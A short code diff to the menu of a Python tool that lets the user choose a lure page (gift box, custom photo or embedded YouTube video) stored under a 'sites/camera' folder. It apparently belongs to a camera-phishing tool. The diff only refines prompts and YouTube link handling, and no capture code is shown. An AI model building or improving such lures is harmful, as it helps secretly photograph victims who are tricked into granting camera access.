@@ -26,12 +26,13 @@ def start():
 
     print("\n\033[1;33m[!] Choose Link Type:\033[0m")
     print("[01] Direct Link (Gift Box Page)")
-    print("[02] Custom Photo Link (Show your Image)")
+    print("[02] Custom Photo Link (Show Image)")
     print("[03] YouTube Video Link (Play Video)")
     link_type = input("\n\033[1;36m[+] Select: \033[0m")
 
+    # FIX: Check input for link type
     if link_type == '2':
-        img_path = input("\n\033[1;32m[+] Enter Photo Path: \033[0m")
+        img_path = input("\n\033[1;32m[+] Enter Photo Path (e.g. /sdcard/image.jpg): \033[0m")
         if os.path.exists(img_path):
             shutil.copy(img_path, "sites/camera/custom.jpg")
             with open("sites/camera/type.txt", "w") as f: f.write("custom")
@@ -40,9 +41,11 @@ def start():
             with open("sites/camera/type.txt", "w") as f: f.write("direct")
     elif link_type == '3':
         yt_link = input("\n\033[1;32m[+] Enter YouTube Video Link: \033[0m")
-        # YouTube link ko embed format mein convert karna (agar normal link ho to)
         if "watch?v=" in yt_link:
             yt_link = yt_link.replace("watch?v=", "embed/")
+        elif "youtu.be/" in yt_link:
+            yt_link = yt_link.replace("youtu.be/", "www.youtube.com/embed/")
+        
         with open("sites/camera/yt_link.txt", "w") as f: f.write(yt_link)
         with open("sites/camera/type.txt", "w") as f: f.write("youtube")
     else:
